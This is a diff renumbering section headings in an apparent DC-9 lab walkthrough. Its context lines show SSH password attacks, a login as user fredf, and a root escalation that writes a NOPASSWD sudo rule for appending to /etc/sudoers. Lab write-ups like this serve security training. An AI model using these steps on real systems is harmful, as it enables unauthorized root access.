@@ -245,7 +245,7 @@ B4-Tru3-001
 ```
 Great, more passwords.
 
-### 8. Attack SSH again and log in
+### 9. Attack SSH again and log in
 Take these new passwords and go back over the user list with ssh.
 ```bash
 ┌──(kali㉿kali)-[]-[~/Desktop]
@@ -278,7 +278,7 @@ fredf@dc-9:~$ id
 uid=1003(fredf) gid=1003(fredf) groups=1003(fredf)
 ```
 
-### 9. Enumerate from user
+### 10. Enumerate from user
 Turns out fredf can run a file as root.
 ```bash
 fredf@dc-9:~$ sudo -l
@@ -328,7 +328,7 @@ TEST1
 ```
 That worked.
 
-### 10. Escalate to root
+### 11. Escalate to root
 Create a file with a line which will allow the current user to sudo without password to run whatever they want, then append that to /etc/sudoers.
 ```bash
 fredf@dc-9:/tmp$ echo "fredf ALL=(ALL) NOPASSWD: ALL" > file1
